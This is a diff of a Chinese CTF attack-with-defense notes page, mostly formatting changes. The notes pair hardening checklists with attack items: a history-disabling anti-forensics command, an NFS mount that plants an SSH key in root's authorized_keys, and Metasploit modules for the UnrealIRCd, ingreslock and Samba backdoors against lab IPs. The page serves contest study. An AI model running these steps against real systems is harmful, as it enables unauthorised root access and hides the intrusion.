@@ -513,66 +513,6 @@
   </li>
 
         
-          
-          
-          
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-12" type="checkbox" id="nav-2-12">
-    
-    <label class="md-nav__link" for="nav-2-12">
-      Shell
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-2-12">
-        Shell
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-12-1" type="checkbox" id="nav-2-12-1">
-    
-    <label class="md-nav__link" for="nav-2-12-1">
-      Php
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
-      <label class="md-nav__title" for="nav-2-12-1">
-        Php
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../../Web&Attack/shell/php/getshell/" title="Getshell" class="md-nav__link">
-      Getshell
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-        
       </ul>
     </nav>
   </li>
@@ -1661,6 +1601,42 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-5-3" type="checkbox" id="nav-4-5-3">
+    
+    <label class="md-nav__link" for="nav-4-5-3">
+      Muma
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-5-3">
+        Muma
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../muma/getshell/" title="Getshell" class="md-nav__link">
+      Getshell
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -2603,62 +2579,67 @@
                 
                 <h2 id="_1">准备<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 <p><a href="https://github.com/WangYihang/Platypus">reverse shell manager</a>
-<a href="https://github.com/WangYihang/Webshell-Sniper">web shell manager</a>
-* 备份www
-* 备份passwd
-* linux_check
-* 修改默认口令 
-* 配置waf，文件监控，日志记录 
-* /var/www/html/ 设置为不可写</p>
+<a href="https://github.com/WangYihang/Webshell-Sniper">web shell manager</a></p>
+<ul>
+<li>备份 www</li>
+<li>备份 passwd</li>
+<li>linux_check</li>
+<li>修改默认口令</li>
+<li>配置 waf，文件监控，日志记录</li>
+<li>/var/www/html/ 设置为不可写</li>
+</ul>
 <h2 id="blog">blog<a class="headerlink" href="#blog" title="Permanent link">&para;</a></h2>
 <p><a href="https://0day.design/2018/12/20/HCTF%202018%20AWD%E5%B0%8F%E7%BB%93">https://0day.design/2018/12/20/HCTF%202018%20AWD%E5%B0%8F%E7%BB%93</a>
-<a href="https://github.com/admintony/Prepare-for-AWD">https://github.com/admintony/Prepare-for-AWD</a>
-* D盾扫后门
-* chattr -i
-* 改cd ls curl wget常用命令
-* getflag所需命令改名
-* </p>
+<a href="https://github.com/admintony/Prepare-for-AWD">https://github.com/admintony/Prepare-for-AWD</a></p>
+<ul>
+<li>D 盾扫后门</li>
+<li>chattr -i</li>
+<li>改 cd ls curl wget 常用命令</li>
+<li>
+<h2 id="getflag">getflag 所需命令改名<a class="headerlink" href="#getflag" title="Permanent link">&para;</a></h2>
+</li>
+</ul>
 <h2 id="_2">防御<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <ul>
 <li>webshell、后门、木马查杀</li>
-<li><a href="http://www.shellpub.com/">http://www.shellpub.com/</a> </li>
-<li>D盾</li>
+<li><a href="http://www.shellpub.com/">http://www.shellpub.com/</a></li>
+<li>D 盾</li>
 <li>火绒</li>
-<li>netstat：端口，连接排查方法 </li>
-<li>如何kill进程/防止kill</li>
-<li>改rw/a权限</li>
+<li>netstat：端口，连接排查方法</li>
+<li>如何 kill 进程/防止 kill</li>
+<li>改 rw/a 权限</li>
 <li>目录禁止写入</li>
 <li>删解释器</li>
-<li>sql防注入代码</li>
+<li>sql 防注入代码</li>
 <li>日志管理</li>
 <li>文件监控</li>
 <li>umask?</li>
 <li>网络端口监控</li>
-<li>waf过滤sqlmap  //sql改head</li>
+<li>waf 过滤 sqlmap //sql 改 head</li>
 <li>上传漏洞防护</li>
-<li>webshell扫描器</li>
-<li>linux后门发现chkrootkit</li>
+<li>webshell 扫描器</li>
+<li>linux 后门发现 chkrootkit</li>
 </ul>
 <h2 id="_3">攻击<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <ul>
 <li>提权脚本</li>
 <li>白盒审计工具</li>
-<li>批量端口扫描 http，爆破phpmyadmin ssh mysql</li>
+<li>批量端口扫描 http，爆破 phpmyadmin ssh mysql</li>
 <li>上传、权限维持脚本</li>
-<li>扫描webshell,路径爆破</li>
+<li>扫描 webshell,路径爆破</li>
 <li>端口扫描</li>
 <li>Cain4.9 多口令破解测试</li>
-<li>arp欺骗工具</li>
+<li>arp 欺骗工具</li>
 <li>Wordpress 综合检测工具?</li>
-<li>各大cms get shell</li>
+<li>各大 cms get shell</li>
 <li>后门批量上传，管理</li>
 <li>后门开机启动 定时运行</li>
 <li>自动化程度提高</li>
 <li>php 5.10 poc</li>
-<li>xss 打cookie</li>
+<li>xss 打 cookie</li>
 <li>自动化攻击，提交</li>
 <li>中国特色字典</li>
-<li>bash不记录历史记录</li>
+<li>bash 不记录历史记录</li>
 </ul>
 <div class="codehilite"><pre><span></span>export HISTFILE=/dev/null
 export HISTSILZ
@@ -2671,7 +2652,7 @@ cat /etc/issue
 uname -a
 whoami
 ssh user@remote_server tail -f /var/log/apache2/access.log <span class="p">|</span> ngxtop -f
-ssh msfadmin@192.168.189.131 tail -f /var/log/apache2/access.log <span class="p">|</span> ngxtop -f 
+ssh msfadmin@192.168.189.131 tail -f /var/log/apache2/access.log <span class="p">|</span> ngxtop -f
 </pre></div>
 
 <h2 id="_4">虚拟化判断<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
@@ -2682,7 +2663,7 @@ ssh msfadmin@192.168.189.131 tail -f /var/log/apache2/access.log <span class="p"
 nmap
 msscan</p>
 <h2 id="_6">常用命令<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
-<p><div class="codehilite"><pre><span></span>scp 文件路径 用户名@IP:存放路径
+<div class="codehilite"><pre><span></span>scp 文件路径 用户名@IP:存放路径
 who 查看tty
 pkill ‐kill ‐t &lt;用户tty&gt;
 <span class="c1">#查看已建立的网络连接及进程</span>
@@ -2696,7 +2677,7 @@ killall &lt;进程名&gt;
 <span class="c1">#封杀某个IP或者ip段，如:.</span>
 iptables ‐I INPUT ‐s . ‐j DROP
 iptables ‐I INPUT ‐s ./ ‐j DROP <span class="c1">#禁止从某个主机ssh远程访问登陆到本机，如123..</span>
-iptable ‐t filter ‐A INPUT ‐s . ‐p tcp ‐‐dport ‐j DROP 
+iptable ‐t filter ‐A INPUT ‐s . ‐p tcp ‐‐dport ‐j DROP
 <span class="c1">#备份mysql数据库</span>
 mysqldump ‐u 用户名 ‐p 密码 数据库名 &gt; back.sql
 mysqldump ‐‐all‐databases &gt; bak.sql
@@ -2706,7 +2687,7 @@ find / *.php ‐perm
 awk ‐F: /etc/passwd
 crontab ‐l
 <span class="c1">#检测所有的tcp连接数量及状态</span>
-netstat ‐ant<span class="p">|</span>awk <span class="p">|</span>grep <span class="p">|</span>sed ‐e ‐e <span class="p">|</span>sort<span class="p">|</span>uniq ‐c<span class="p">|</span>sort ‐rn 
+netstat ‐ant<span class="p">|</span>awk <span class="p">|</span>grep <span class="p">|</span>sed ‐e ‐e <span class="p">|</span>sort<span class="p">|</span>uniq ‐c<span class="p">|</span>sort ‐rn
 <span class="c1">#查看页面访问排名前十的IP</span>
 cat /var/log/apache2/access.log <span class="p">|</span> cut ‐f1 ‐d
 r <span class="p">|</span> head ‐
@@ -2714,7 +2695,8 @@ r <span class="p">|</span> head ‐
 cat /var/log/apache2/access.log <span class="p">|</span> cut ‐f4 ‐d
 r <span class="p">|</span> head ‐
 </pre></div>
-netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
+
+<p>netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
 win:netstat -no 查看网络链接</p>
 <h1 id="attack">防御&amp;&amp;attack<a class="headerlink" href="#attack" title="Permanent link">&para;</a></h1>
 <h2 id="_7">防篡改<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
@@ -2722,14 +2704,14 @@ win:netstat -no 查看网络链接</p>
 chattr -R +i /var/www/html
 chattr +a /var/log 只能追加</p>
 <h2 id="_8">进程检查<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
-<p>如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket 连接数的命令为:
-比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。</p>
-<h2 id="nfs">检查nfs<a class="headerlink" href="#nfs" title="Permanent link">&para;</a></h2>
+<p>如果我们怀疑某个进程正在是受到溢出攻击后创建的 shell 进程，我们可以分析这个进程是否有 socket 连接，linux 中查看指定进程 socket 连接数的命令为:
+比如我们查看 ssh 进程的 socket 连接。如果我们检测的程序有 socket 连接，说明它正在进行网络通信，我们就需要进行进一步判断。</p>
+<h2 id="nfs">检查 nfs<a class="headerlink" href="#nfs" title="Permanent link">&para;</a></h2>
 <p>rpcinfo -p 192.168.189.131
 showmount -e
- mkdir /tmp/r00t</p>
+mkdir /tmp/r00t</p>
 <p>mount -t nfs 192.168.99.131:/ /tmp/r00t/</p>
-<p>cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/r00t/root/.ssh/authorized_keys </p>
+<p>cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/r00t/root/.ssh/authorized_keys</p>
 <p>umount /tmp/r00t</p>
 <p>ssh root@192.168.99.131</p>
 <h2 id="ftp-ssh">ftp ssh 配置文件检查<a class="headerlink" href="#ftp-ssh" title="Permanent link">&para;</a></h2>
@@ -2761,27 +2743,27 @@ telnet&gt; quit
 <p>Escape character is &#039;^]&#039;.</p>
 <p>id;</p>
 <p>uid=0(root) gid=0(root)</p>
-<h2 id="6667unreaircd-irc">6667端口上运行着UnreaIRCD IRC<a class="headerlink" href="#6667unreaircd-irc" title="Permanent link">&para;</a></h2>
+<h2 id="6667-unreaircd-irc">6667 端口上运行着 UnreaIRCD IRC<a class="headerlink" href="#6667-unreaircd-irc" title="Permanent link">&para;</a></h2>
 <p>use exploit/unix/irc/unreal_ircd_3281_backdoor
- getshell</p>
+getshell</p>
 <h2 id="ingreslock">ingreslock 后门<a class="headerlink" href="#ingreslock" title="Permanent link">&para;</a></h2>
 <p>telnet 192.168.99.131 1524</p>
-<h2 id="smb">smb后门<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h2>
-<p>配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit提供一个攻击模块，允许接入一个root文件系统通过一个匿名接入和可写入的共享设置。
+<h2 id="smb">smb 后门<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h2>
+<p>配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit 提供一个攻击模块，允许接入一个 root 文件系统通过一个匿名接入和可写入的共享设置。
 smbclient -L //192.168.99.131
- use auxiliary/admin/smb/samba_symlink_traversal 
- set RHOST 192.168.99.131
-  set SMBSHARE tmp
-  exploit </p>
+use auxiliary/admin/smb/samba_symlink_traversal
+set RHOST 192.168.99.131
+set SMBSHARE tmp
+exploit</p>
 <p>smbclient //192.168.99.131/tmp
- getshell</p>
-<h2 id="dwa">dwa后门<a class="headerlink" href="#dwa" title="Permanent link">&para;</a></h2>
+getshell</p>
+<h2 id="dwa">dwa 后门<a class="headerlink" href="#dwa" title="Permanent link">&para;</a></h2>
 <p>Default username = admin
 Default password = password</p>
 <h2 id="php">php 漏洞<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
-<p>CVE–2012-1823和 CVE–2012-2311</p>
-<h1 id="ip">查看页面访问排名前十的IP<a class="headerlink" href="#ip" title="Permanent link">&para;</a></h1>
-<p>netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn </p>
+<p>CVE–2012-1823 和 CVE–2012-2311</p>
+<h1 id="ip">查看页面访问排名前十的 IP<a class="headerlink" href="#ip" title="Permanent link">&para;</a></h1>
+<p>netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn</p>
 <p><a href="http://bobao.360.cn/ctf/learning/210.html">http://bobao.360.cn/ctf/learning/210.html</a><br />
 <a href="https://bbs.ichunqiu.com/thread-25092-1-1.html?from=aqzx2">https://bbs.ichunqiu.com/thread-25092-1-1.html?from=aqzx2</a></p>
                 
